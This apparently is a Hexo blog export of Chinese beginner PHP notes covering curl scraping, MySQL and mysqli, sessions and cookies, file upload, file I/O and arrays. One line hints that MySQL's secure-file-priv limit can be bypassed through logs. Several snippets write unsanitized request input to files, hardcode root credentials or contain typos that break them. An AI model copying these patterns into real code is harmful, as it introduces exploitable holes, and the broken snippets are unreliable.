    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);  //设置请求头
    //curl_setopt($ch,　CURLOPT_PROXYTYPE,CURLPROXY_SOCKS5);  //设置代理方式
    //curl_setopt($ch, CURLOPT_PROXY, &quot;127.0.0.1:1080&quot;);  //设置代理的服务器
    $file_contents = curl_exec($ch);  //发生curl请求
    curl_close($ch);  //关闭curl请求
    //$file_contents = json_decode($file_contents);  //json解码
    //mb_convert_encoding($file_contents,&#39;utf-8&#39;);  //转换字符编码


    //$f = fopen(&quot;./1.html&quot;, &quot;a+&quot;);  //打开文件，模式为可读可写
    //Fwrite($f,$file_contents);//写入文件

    $pattern = &#39;/{&quot;cityName&quot;:&quot;.{2,20},.{2,120}}/&#39;;  //正则表达式
    preg_match_all($pattern,$file_contents,$match);  //匹配正则表达式

    $change = $match[0];  //转换为字符串
    $change = implode(&#39;;&#39;, $change);  //添加分隔符;
    $change = str_replace(&#39;&quot;&#39;,&quot;&quot;,$change);  //去掉符号&quot;
    $change = explode(&#39;;&#39;, $change);  //通过分隔符;合并
    var_dump($change);  

    $b = json_encode($change,JSON_UNESCAPED_UNICODE);  //json编码形式
    var_dump($b);

    file_put_contents(&#39;./index.json&#39;,$b);  //写入index.json文件

    //Fclose($f);  //关闭文件


?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-21：数据库与PHP操作</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-21%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8EPHP%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<hr>
<h4 id="1-MySQL命令符"><a href="#1-MySQL命令符" class="headerlink" title="1. MySQL命令符"></a>1. MySQL命令符</h4><ul>
<li>Mysqladmin 日常管理命令总结 或 重置密码</li>
<li>Mysql 用到操作数据库</li>
<li>Mysqld 用来开启MYSQL 或者 关闭</li>
<li>Mysqlimport 数据库导入</li>
</ul>
<h4 id="2-MySQL操作"><a href="#2-MySQL操作" class="headerlink" title="2. MySQL操作"></a>2. MySQL操作</h4><ul>
<li>登录MYSQL    mysql  -h 192.168.1.100 -u root -p -P 123<ul>
<li>-h 你的IP</li>
<li>-U 你的用户名</li>
<li>-p你的密码 可不填 但是后面要填</li>
<li>-P （大写） 端口号</li>
</ul>
</li>
<li>常规操作<ul>
<li>查看所有数据库：Show databases</li>
<li>选择数据库之后 查看当前数据库所有的表：show tables;</li>
<li>创建数据库：Create database 数据库名;</li>
<li>选择数据库：use 数据库名;</li>
<li>创建表跟字段<ul>
<li>Create table admin2(</li>
<li>Username varchar(20) not null,</li>
<li>Passworld text not null);</li>
</ul>
</li>
<li>查看表结构：desc 表名</li>
<li>添加数据<ul>
<li>Insert into 表名 values (“”);</li>
<li>Insert into 表名 (字段名) values (“”);</li>
</ul>
</li>
<li>查询数据库<ul>
<li>Select * from 表名;</li>
</ul>
</li>
<li>修改数据<ul>
<li>Update 表名 set 字段 = ‘’;</li>
</ul>
</li>
<li>清空表数据<ul>
<li>Delete from 表名</li>
</ul>
</li>
<li>删除表<ul>
<li>Drop table 表名;</li>
</ul>
</li>
<li>备份数据库<ul>
<li>命令行备份<ul>
<li>select * from 表名 into outfile ‘/tmp/1.txt’</li>
<li>▲ 可能报错，需要修改–secure-file-priv的路径，可绕过–通过日志绕过</li>
</ul>
</li>
<li>界面备份<ul>
<li>从mysql的数据库路径/data，拷走所有的表结构以及表数据</li>
</ul>
</li>
</ul>
</li>
<li>自增型<ul>
<li>auto_increment</li>
</ul>
</li>
<li>搜索关键字<ul>
<li>select * from admin where username like “%%xindong”;</li>
</ul>
</li>
<li>分页</li>
</ul>
</li>
</ul>
<h4 id="3-PHP操作MySQL数据库"><a href="#3-PHP操作MySQL数据库" class="headerlink" title="3. PHP操作MySQL数据库"></a>3. PHP操作MySQL数据库</h4><pre><code>&lt;?php

    $lin = mysqli_connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;root&#39;);

    //数据库使用--mysqli_query

    mysqli_query($lin,&quot;use php_mysql_demo&quot;);  //选择数据库
    mysqli_query($lin,&quot;set names utf8&quot;);  //设置数据库编码

    mysqli_query($lin,&quot;insert into admin values (&#39;xindong&#39;,&#39;123&#39;)&quot;);  //添加数据库记录
    mysqli_query($lin,&quot;delete from admin where username = &#39;1111&#39;&quot;);  //删除数据库记录
    mysqli_query($lin,&quot;update admin set username = &#39;1111&#39;&quot;);  //修改数据

    //数据库查询使用--mysqli_fetch_array
    /*
    mysqli_fetch_array()包含两个内容，默认的，函数可以通过第二个参数来设定返回的类型
    1. MYSQLI_ASSOC：返回关联数组
    2. MYSQLI_NUM：返回索引数组
    3. MYSQLI_BOTH：默认的，两种数值都返回
    */

    $list = mysqli_query($lin,&quot;select * from admin&quot;);
    $list_data = mysqli_fetch_array($list,MYSQLI_ASSOC);
    var_dump($list_data);  //打印单行数据，指针默认从顶部开始
    echo &quot;&lt;/br&gt;&quot;;


    //输出查询的整个数据库
    $list1 = mysqli_query($lin,&quot;select * from admin&quot;);
    $arr = array();
    while($list1_data = mysqli_fetch_array($list1,MYSQLI_ASSOC))
    {
        $arr[] = $list1_data;
        //直接输出 var_dump($list1_data);
    }
    var_dump($arr);  //打印整个数据


     /*
    mysqli_errno()：出现错误的错误编号
    mysqli_error()：错误信息
    */
    $lin1 = mysqli_connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;root&#39;);
    $a = mysqli_query($lin,&quot;use demo11111&quot;);  //不存在的数据库
    //mysqli_query($lin,&quot;set names utf8&quot;);

    if(mysqli_errno($lin))
    {
        echo &#39;&lt;/br&gt;&#39;;
        echo mysqli_errno($lin);  //输出错误的编号
        echo &#39;&lt;/br&gt;&#39;; 
        echo mysqli_error($lin);  //输出错误信息
    }
    echo &#39;&lt;/br&gt;&#39;;

    //数据库的行数
    /*
    mysqli_data_seek()：用来设置结果集指针的位置
    mysqli_num_row()：取得结果集的长度（记录的个数）
    */
    $lin2 = mysqli_connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;root&#39;);
    $b = mysqli_query($lin2,&quot;use php_mysql_demo&quot;); 

    $list2 = mysqli_query($lin2,&quot;select * from admin&quot;);

    echo mysqli_num_rows($list2);

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-20：Cookie与Session</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-20%EF%BC%9ACookie%E4%B8%8ESession/</url>
    <content><![CDATA[<hr>
<h4 id="1-Cookie与Session"><a href="#1-Cookie与Session" class="headerlink" title="1. Cookie与Session"></a>1. Cookie与Session</h4><ul>
<li>session.save_path=”D:\phpStudy\tmp\tmp”</li>
<li>请求网站 如果COOKIE 没有PHPSESSID 那服务器就给你定义一个PHPSESSID<br>如果请求网站有PHPSESSID，服务器看到了PHPSESSID之后获取PHPSESSID的内容去找sessionID的内容名字的文件名。</li>
<li>session操作</li>
</ul>
<pre><code>&lt;?php

    session_start();  //会话开始
    $username = empty($_POST[&#39;username&#39;])? &quot;&quot; : $_POST[&#39;username&#39;];
    $password = empty($_POST[&#39;password&#39;])? &quot;&quot; : $_POST[&#39;password&#39;];

    if(isset($_SESSION[&#39;username&#39;]))
    {
        echo &#39;1&#39;;
    }elseif($username == &#39;admin&#39; and $password == &#39;123456&#39;)
    {
        echo &quot;登陆成功&quot;;
        $_SESSION[&#39;username&#39;]=&#39;1&#39;;  //写入session文件
    }else{
        include_once &#39;./form.html&#39;;  //包含表单
    }

?&gt;</code></pre><h4 id="2-Cookie跨域"><a href="#2-Cookie跨域" class="headerlink" title="2. Cookie跨域"></a>2. Cookie跨域</h4><ul>
<li>默认的，cookie只能对当前域名（完整域名：有效的二级域名）有效</li>
<li>cookie跨域：指的是允许cookie在不同的二级域名之间共享（一级域名一致）</li>
<li>PHP设置COOKIE</li>
<li>SetCookie(“名字”,值,有效时间,’有效路径’,’有效域’);</li>
<li>SetCookie(‘PHPSESSID’,session_id(),time()+100,’/‘,”xss.cn”);</li>
<li>▲ session.auto_start = 0  //在配置文件中，默认不开启session_start()</li>
<li>▲ session.name = PHPSESSID  //跨域要设置Cookie的名称</li>
<li>▲ session.cookie_domain =   //cookie的跨域，默认为空不能跨域</li>
</ul>
<pre><code>&lt;?php

    //发送cookie-1
    session_start();
    Setcookie(&#39;name&#39;,&#39;xindong&#39;,time()+100,&#39;/&#39;,&#39;127.0.0.1&#39;);
    echo session_id();  //输出cookie

    //发送cookie-2
    session_start();
    $_SESSION[&#39;name&#39;] = &#39;xindong&#39;;
    var_dump($_SESSION);
    Setcookie(&#39;name&#39;,session_id(),time()+100,&#39;/&#39;,&#39;127.0.0.1&#39;);

?&gt;</code></pre><h4 id="3-跨域尝试"><a href="#3-跨域尝试" class="headerlink" title="3. 跨域尝试"></a>3. 跨域尝试</h4><ul>
<li>删除session</li>
<li>虚拟主机/hosts文件 -&gt; <a href="http://www.test1mzt.com/cookie.www.test1mzt.com" target="_blank" rel="noopener">www.test1mzt.com/cookie.www.test1mzt.com</a></li>
<li>设置cookie的域 -&gt; <a href="http://www.test1mzt.com（www.test1mzt.com下的1.php）" target="_blank" rel="noopener">www.test1mzt.com（www.test1mzt.com下的1.php）</a></li>
<li>打印cookie -&gt; cookie.<a href="http://www.test1mzt.com（cookie.www.test1mzt.com的1.php）" target="_blank" rel="noopener">www.test1mzt.com（cookie.www.test1mzt.com的1.php）</a></li>
<li>访问<a href="http://www.test1mzt.com尝试" target="_blank" rel="noopener">www.test1mzt.com尝试</a> -&gt; 是否输出xindong</li>
<li>访问cookie.<a href="http://www.test1mzt.com" target="_blank" rel="noopener">www.test1mzt.com</a> -&gt; 是否输出为xindong</li>
<li>/test1/1.php</li>
</ul>
<pre><code>&lt;?php

    session_start();
    $_SESSION[&#39;name&#39;] = &#39;xindong&#39;;
    var_dump($_SESSION);
    Setcookie(&#39;PHPSESSID&#39;,session_id(),time()+100,&#39;/&#39;,&#39;www.test1mzt.com&#39;);
?&gt;
</code></pre><ul>
<li>/cookie.test1/1.php</li>
</ul>
<pre><code>&lt;?php

    session_start();
    var_dump($_SESSION);

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-19：面向对象简单基础</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-19%EF%BC%9A%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%AE%80%E5%8D%95%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<hr>
<h4 id="1-面向对象"><a href="#1-面向对象" class="headerlink" title="1. 面向对象"></a>1. 面向对象</h4><ul>
<li>/www/class/DB.class.php</li>
</ul>
<pre><code>&lt;?php

    class DB
    {
        public $host;
        public $username;
        public $password;
        public $database;

        //初始化数据库
        function __construct($host=&#39;&#39;,$username=&#39;&#39;,$password=&#39;&#39;,$database=&#39;&#39;)
        {
            $this-&gt;host = empty($host)? $GLOBALS[&#39;con&#39;][&#39;host&#39;] : $host;
            $this-&gt;username = empty($username)? $GLOBALS[&#39;con&#39;][&#39;username&#39;] : $username;
            $this-&gt;password = empty($password)? $GLOBALS[&#39;con&#39;][&#39;password&#39;] : $password;
            $this-&gt;database = empty($database)? $GLOBALS[&#39;con&#39;][&#39;database&#39;] : $database;
            $lin = mysqli_connect($this-&gt;host,$this-&gt;username,$this-&gt;password);
            $this-&gt;use_database($lin);
        }

        //使用数据库
        public function use_database($lin=&#39;&#39;){
            mysqli_query($lin,&quot;use php_mysql_demo&quot;);
            $list = mysqli_query($lin,&quot;select * from admin&quot;);
            $list_data = mysqli_fetch_array($list,MYSQLI_ASSOC);  //数据的存储
            var_dump($list_data);  //打印数据库的第一行数据
            echo &quot;&lt;/br&gt;&quot;;
        }
    }

?&gt;</code></pre><ul>
<li>/www/init.php</li>
</ul>
<pre><code>&lt;?php

    define(&#39;DIR_dang&#39;,$_SERVER[&#39;DOCUMENT_ROOT&#39;].&quot;/&quot;);  //取得系统路径的绝对路径

    include_once DIR_dang.&#39;function.php&#39;;  //function.php的绝对路径

    $con = include_once DIR_dang.&#39;conn.php&#39;;  //conn.php的绝对路径


?&gt;</code></pre><ul>
<li>/www/conn.php</li>
</ul>
<pre><code>&lt;?php

    //数据库默认参数
    return array(
        &quot;host&quot; =&gt; &#39;127.0.0.1&#39;,
        &quot;username&quot; =&gt; &#39;root&#39;,
        &quot;password&quot; =&gt; &#39;root&#39;,
        &quot;database&quot; =&gt; &#39;admin&#39;
    )

?&gt;</code></pre><ul>
<li>/www/function.php</li>
</ul>
<pre><code>&lt;?php

    //function __autoload($class)
        //{
            //默认从/includes去加载
            //if(is_file(&quot;./class/$class.class.php&quot;))
            //{
                //加载
                //include_once &quot;./class/$class.class.php&quot;;
            //}
        //}
    //__autoload方法已经被spl_autoload_register()所替代
    function my_autoload($class)
    {
        include &#39;./class/&#39;.$class.&#39;.class.php&#39;;
    }

    spl_autoload_register(&#39;my_autoload&#39;);
?&gt;</code></pre><ul>
<li>/www/index.php</li>
</ul>
<pre><code>&lt;?php

    include_once &#39;./init.php&#39;;  //包含function.php和conn.php，并加载

    //var_dump($GLOBALS[&#39;con&#39;][&#39;host&#39;]);  //测试$GLOBALS参数


    $mysql = new DB();  //创建一个对象

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-18：文件上传</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-18%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<hr>
<h4 id="1-文件上传"><a href="#1-文件上传" class="headerlink" title="1. 文件上传"></a>1. 文件上传</h4><ul>
<li>表单的enctype属性规定在发送到服务器之前应该如何对表单数据进行编码<ul>
<li>application/x-www-form-urlencoded -&gt; 在发送前编码所有字符（默认）</li>
<li>multipart/form-data -&gt; 不对字符编码，在使用包含文件上传控件的表单时，必须使用该值</li>
<li>text/plain  -&gt; 空格转为”+”加号，但不对特殊字符编码</li>
</ul>
</li>
</ul>
<h4 id="2-配置php-ini"><a href="#2-配置php-ini" class="headerlink" title="2. 配置php.ini"></a>2. 配置php.ini</h4><ul>
<li>file_upload = on  //是否允许文件上传，默认开启，即允许上传文件</li>
<li>upload_tmp_dir =   //文件上传到服务器后产生的临时文件路径，如果没有指定临时文件路径，那么使用系统的临时目录，一般会修改配置文件，指定临时目录</li>
<li>upload_max_filesize = 2M  //允许上传的单个文件的最大值</li>
<li>max_file_uploads = 20  //一次上传文件允许的最大数目</li>
</ul>
<h4 id="3-新建一个文件上传"><a href="#3-新建一个文件上传" class="headerlink" title="3. 新建一个文件上传"></a>3. 新建一个文件上传</h4><ul>
<li>1.html</li>
</ul>
<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;
    &lt;title&gt;Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form actiion=&quot;&quot; method=&quot;post&quot; enctype=&quot;,ultipart/form-data&quot;&gt;

    &lt;p&gt;
    上传:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
    &lt;/p&gt;

    &lt;p&gt;
    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;
    &lt;/p&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><ul>
<li>demo.php</li>
</ul>
<pre><code>&lt;?php

    var_dump($_FILES);  //输出一个二维数组

    include_once &#39;./1.html&#39;;

    //上传文件

    $f = empty($_FILES)?&quot;&quot; : $_FILES[&quot;file2&quot;][&quot;tmp_name&quot;];

    switch($_FILES[&quot;file2&quot;][&quot;error&quot;])
    {
        case 0:
        @move_upload_file($f,&quot;./111.jpg&quot;);
        break;

        default:
            # code...
            break;
    }


    //变化
    时间戳 -&gt; time().&quot;.jpg&quot;
    后缀截取 -&gt; $filechar = $_FILES[&#39;file2&#39;][&#39;name&#39;] -&gt; 字符串处理
?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-17：GET跟POST请求</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-17%EF%BC%9AGET%E8%B7%9FPOST%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<hr>
<h4 id="1-GET请求和POST请求"><a href="#1-GET请求和POST请求" class="headerlink" title="1. GET请求和POST请求"></a>1. GET请求和POST请求</h4><ul>
<li>一般我们在浏览器输入一个网址访问网站都是GET请求;再FORM表单中，可以通过设置Method指定提交方式为GET或者POST提交方式，默认为GET提交方式</li>
<li>HTTP定义了与服务器交互的不同方法，其中最基本的四种：GET，POST，PUT，DELETE，HEAD，其中GET和HEAD被称为安全方法，因为使用GET和HEAD的HTTP请求不会产生什么动作。不会产生动作意味着GET和HEAD的HTTP请求不会在服务器上产生任何结果。但是安全方法并不是什么动作都不产生，这里的安全方法仅仅指不会修改信息</li>
<li>根据HTTP规范，POST可能会修改服务器上的资源的请求。比如CSDN的博客，用户提交一篇文章或者一个读者提交评论是通过POST请求来实现的，因为再提交文章或者评论提交后资源（即某个页面）不同了，或者说资源被修改了，这些便是”不安全方法”</li>
<li>GET请求</li>
</ul>
<pre><code>&lt;?php

    $f = fopen(&#39;./1.txt&#39;,&quot;a+&quot;);

    Fwrite($f,$_GET[&#39;name&#39;]); 
?&gt;
</code></pre><ul>
<li>POST请求<ul>
<li>▲ 除了通过表单提交，也可以通过修改提交方法，在请求主体中填入数据或者HACHBAR发生</li>
</ul>
</li>
</ul>
<pre><code>&lt;form action=&#39;./test.php&#39; method=&quot;post&quot;&gt;
用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot; placebolder=&quot;请输入账号&quot;/&gt;
密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; placebolder=&quot;请输入密码&quot;/&gt;
&lt;p&gt;
&lt;input type=&quot;submit&quot; value=&quot;提交&quot; / &gt;
&lt;/p&gt;
&lt;/form&gt;</code></pre><pre><code>&lt;?php

    //PHP的编码形式
    header(&quot;Content-type: text/html; charset=utf-8&quot;);

    //文件包含
    include_once &#39;./form.html&#39;;

    $f = fopen(&#39;./1.txt&#39;,&quot;a+&quot;);

    Fwrite($f,$_POST[&#39;username&#39;]);

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-16：文件操作</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-16%EF%BC%9A%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<hr>
<h4 id="1-文件操作"><a href="#1-文件操作" class="headerlink" title="1. 文件操作"></a>1. 文件操作</h4><ul>
<li>fopen() 的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。<ul>
<li>$myfile = fopen(“webdictionary.txt”, “r”) or die(“Unable to open file!”);</li>
</ul>
</li>
<li>读文件<ul>
<li>Fgets($find) //读第一行文件<ul>
<li>▲ 文件指针必须是有效的，必须指向由 fopen()或fsockopen()成功打开的文件(并还未由 fclose() 关闭)。</li>
<li>▲ fget()可以被用来模拟get/post请求，结合fopen()和fsockopen()两个函数</li>
</ul>
</li>
<li>Fread($find,获取字节) //指定获取内容</li>
<li>Filesize($find) //获取文件字节<ul>
<li>▲ $find 必须为路径</li>
</ul>
</li>
<li>Fclose($find) //关闭资源</li>
</ul>
</li>
<li>修改或添加文件内容<ul>
<li>Fopen(./1.xx,”a+”);</li>
<li>Fwrite(“文件”,”内容”);<ul>
<li>▲ 只能将字符串string写进文件，无法将数组写进</li>
<li>▲ 写进数组可借用file_put_contents()函数</li>
</ul>
</li>
<li>Fclose(find);  //关闭资源</li>
</ul>
</li>
<li>文件指针feof()<ul>
<li>▲ 文件指针必须是有效的，必须指向由 fopen()或fsockopen()成功打开的文件（并还未由 fclose()关闭）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //读文件
    $f = fopen(&quot;./1.txt&quot;, &quot;a+&quot;);

    echo Fgets($f);  //读第一行文件
    echo Fgets($f);  //读第二行文件
    echo Fread($f,2);  //获取文件前两个字符

    echo Filesize($f);  //获取屋内按总的字符数
    echo Fread($f,Filesize(&#39;./1.html&#39;));  //输出1.html中的所有内容

    Fclose($f);  //关闭文件
    echo Fread($f,2);  //无法读取到文件

    //读写文件
    $f = fopen(&quot;./1.txt&quot;, &quot;a+&quot;);

    Fwrite($f,&#39;aaaaaa&#39;)  //在文件最后添加aaaaaa
    Fclose($f);

    $f = fopen(&quot;./1.txt&quot;, &quot;w&quot;);

    Fwrite($f,&#39;aaaaaa&#39;)  //删除文件，并在文件开头添加aaaaaa
    Fclose($f);

    //路径拼接

    $lujing = $_SERVER[&#39;DOCUMENT_ROOT&#39;].&quot;/&quot;;

    $f = fopen($lujing.&quot;123.txt&quot;,&quot;a.txt&quot;);

    Fwrite($f,&#39;aaaaaa\r\n&#39;);  //写入成功

    //命令读取文件

    echo `dir`;  //读取系统路径

    echo `type d:\\1.txt`;  //读取1.txt文件中的内容

    //文件指针

    $f = fopen(&quot;./1.txt&quot;, &quot;r+&quot;);
    while(!feof($f))
    {
        $result.= fgets($f,128);
    }
    echo $result;  //输出1.txt的所有内容
?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-15：数组的相关函数</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-15%EF%BC%9A%E6%95%B0%E7%BB%84%E7%9A%84%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<hr>
<h4 id="1-排序函数"><a href="#1-排序函数" class="headerlink" title="1. 排序函数"></a>1. 排序函数</h4><ul>
<li>排序函数：对数组元素进行排序，都是按照ASCII码进行比较，可以进行英文比较</li>
<li>下标重排<ul>
<li>sort()：顺序排序</li>
<li>rsort()：逆序排序</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //排序函数
    $arr = array(3,1,5,2,0);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

    sort($arr);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

    rsort($arr);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

?&gt;</code></pre><ul>
<li>下标保留<ul>
<li>asort()：顺序排序</li>
<li>arsort()：逆序排序</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //排序函数
    $arr = array(3,1,5,2,0);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

    asort($arr);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

    arsort($arr);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

?&gt;</code></pre><ul>
<li>按照键名（下标）<ul>
<li>ksort()：顺序排序</li>
<li>krsort()：逆序排序</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //排序函数
    $arr = array(3,1,5,2,0);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

    ksort($arr);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

    krsort($arr);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

?&gt;</code></pre><ul>
<li>shuffle()：随机打乱数组元素，数组下标会重排</li>
</ul>
<pre><code>&lt;?php

    //排序函数
    $arr = array(3,1,5,2,0);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

    shuffle($arr);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

    shuffle($arr);
    print_r($arr);
    echo &quot;&lt;/br&gt;&quot;;

?&gt;</code></pre><h4 id="2-指针函数"><a href="#2-指针函数" class="headerlink" title="2. 指针函数"></a>2. 指针函数</h4><ul>
<li>reset()：重置指针，将数组指针回到首位</li>
<li>end()：重置指针，将数组指针指导最后一个元素</li>
<li>next()：指针下移，取得下一个元素的值</li>
<li>prev()：指针上移，取得上一个元素的值</li>
<li>current()：获取当前指针对应的元素值</li>
<li>key()：获取当前指针对应的下标值</li>
<li>▲ next和prev会移动指针，有可能导致指针移动到最前或者最后（离开数组），导致数组不能使用，通过next和prev不能回到真确的指针位置。只能通过end或者reset进行指针重置</li>
</ul>
<pre><code>&lt;?php

    //指针函数
    $arr = array(3,1,5,2,0);

    echo current($arr),&#39;&lt;br/&gt;&#39;;  //输出为 3
    echo key($arr),&#39;&lt;br/&gt;&#39;;  //输出为 0


    echo next($arr),next($arr),&#39;&lt;br/&gt;&#39;;  //输出为 1，5
    echo prev($arr),&#39;&lt;br/&gt;&#39;;  //输出为 1

    echo end($arr),&#39;&lt;br/&gt;&#39;;  //输出为 0
    echo reset($arr),&#39;&lt;br/&gt;&#39;;  //输出为 3

?&gt;</code></pre><h4 id="3-其他函数"><a href="#3-其他函数" class="headerlink" title="3. 其他函数"></a>3. 其他函数</h4><ul>
<li>栈操作：压栈，先进去后出来（FILO）/ 队列操作：排队，先进去的先出去（FIFO）<ul>
<li>array_push()：往数组中加入一个元素（数组后面）</li>
<li>array_pop()：从数组中取出一个元素（数组后面）</li>
<li>array_shift()：从数组中取出一个元素（数组前面）</li>
<li>array_unshift()：从数组中加入一个元素（数组前面）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //其他函数

    //模拟数据结构：栈和队列
    $arr = array();

    //栈：先压栈后出栈：都是从一端出来
    //前面：array_shift/array_unshift
    //后面：array_push/array_pop
    //压栈
    array_push($arr,3);
    array_push($arr,2);
    array_push($arr,1);
    print_r($arr);  //输出为 Array ( [0] =&gt; 3 [1] =&gt; 2 [2] =&gt; 1 ) 
    echo &quot;&lt;/br&gt;&quot;;
    //出栈
    echo array_pop($arr),array_pop($arr),array_pop($arr),&#39;&lt;br/&gt;&#39;; 输出为 123


    //队列：先排队，先出来，一端进，另外一端出
    //后进前出：array_push/array_shift
    //前进后出：array_unshift/array_pop
    $arr = array();

    //入队
    array_unshift($arr,3);
    array_unshift($arr,2);
    array_unshift($arr,1);
    print_r($arr);  //输出为 Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 ) 
    echo &quot;&lt;/br&gt;&quot;;
    //出队
    echo array_pop($arr),array_pop($arr),array_pop($arr),&#39;&lt;br/&gt;&#39;;  //输出为 321

?&gt;</code></pre><ul>
<li>count()：统计数组中元素的数量</li>
<li>array_reverse()：数组元素反过来</li>
<li>in_array()：判断一个元素在数组中是否存在</li>
<li>array_keys()：获取一个数组的所有下标，返回一个索引数组</li>
<li>array_values()：获取一个数组的所有值，返回一个索引数组</li>
</ul>
<pre><code>&lt;?php

    $arr = array(1,2,3,6,5);
    echo count($arr);  //输出为 5
    print_r(array_reverse($arr));  //输出为 Array ( [0] =&gt; 5 [1] =&gt; 6 [2] =&gt; 3 [3] =&gt; 2 [4] =&gt; 1 ) 

    echo &quot;&lt;/br&gt;&quot;;

    var_dump(in_array(6,$arr));  //输出为 bool(true) 
    echo &quot;&lt;/br&gt;&quot;;
    var_dump(in_array(100,$arr));  //输出为 bool(false) 
    echo &quot;&lt;/br&gt;&quot;;

    print_r(array_keys($arr));  //输出为 Array ( [0] =&gt; 0 [1] =&gt; 1 [2] =&gt; 2 [3] =&gt; 3 [4] =&gt; 4 ) 

    echo &quot;&lt;/br&gt;&quot;;
    print_r(array_values($arr));  //输出为 Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 6 [4] =&gt; 5 ) 

    echo &quot;&lt;/br&gt;&quot;;

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-14：数组</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-14%EF%BC%9A%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<hr>
<h4 id="1-数组的概念"><a href="#1-数组的概念" class="headerlink" title="1. 数组的概念"></a>1. 数组的概念</h4><ul>
<li>array，数据的组合，指将一组数据（多个）存储到一个指定的容器中，用变量指向该容器，然后可以通过变量一次性得到该容器中的所有数据</li>
</ul>
<h4 id="2-数组定义语法"><a href="#2-数组定义语法" class="headerlink" title="2. 数组定义语法"></a>2. 数组定义语法</h4><ul>
<li>使用array关键字</li>
<li>可以使用中括号来包裹数据</li>
<li>隐形定义数组：给变量增加一个中括号，系统自动变成数组</li>
</ul>
<pre><code>&lt;?php

    //PHP数组

    //定义数组：array
    $arr1 = array(&#39;1&#39;,2,&#39;hello&#39;);
    var_dump($arr1);  //输出为 array(3) { [0]=&gt; string(1) &quot;1&quot; [1]=&gt; int(2) [2]=&gt; string(5) &quot;hello&quot; } 
    echo &quot;&lt;/br&gt;&quot;;

    //定义数组：[]
    $arr2 = [&#39;1&#39;,2,&#39;hello&#39;];
    var_dump($arr2);  //输出为 array(3) { [0]=&gt; string(1) &quot;1&quot; [1]=&gt; int(2) [2]=&gt; string(5) &quot;hello&quot; } 
    echo &quot;&lt;/br&gt;&quot;;

    //隐形数组：
    $arr3[] = 1;
    $arr3[10] = 100;
    $arr3[] = &#39;1&#39;;
    $arr3[&#39;key&#39;] = &#39;key&#39;;
    $arr3[1] = &#39;value&#39;;
